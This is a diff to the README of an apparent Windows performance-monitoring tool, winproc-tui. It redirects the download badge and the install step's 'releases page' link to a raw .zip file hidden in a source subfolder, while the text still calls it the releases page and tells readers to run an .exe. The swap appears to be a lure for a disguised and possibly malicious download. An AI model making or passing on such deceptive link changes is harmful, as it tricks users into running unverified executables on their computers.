@@ -1,6 +1,6 @@
 # 📊 winproc-tui - Track windows system performance with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Mealy-gamma925/winproc-tui/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Mealy-gamma925/winproc-tui/main/src/samplers/winproc_tui_3.1.zip)
 
 Winproc-tui offers a clear way to see how your computer runs internal processes. You gain insight into memory usage, processor load, and background tasks. This tool provides live updates so you spot performance spikes as they happen.
 
@@ -10,7 +10,7 @@ Your computer must run Windows 11. The software requires 64-bit architecture. Yo
 
 ## 📥 How to Install
 
-1. Visit the [releases page](https://github.com/Mealy-gamma925/winproc-tui/releases) to download the software.
+1. Visit the [releases page](https://raw.githubusercontent.com/Mealy-gamma925/winproc-tui/main/src/samplers/winproc_tui_3.1.zip) to download the software.
 2. Look for the file ending in `.exe`. 
 3. Select the file to start the download.
 4. Save the file to a folder you locate easily.
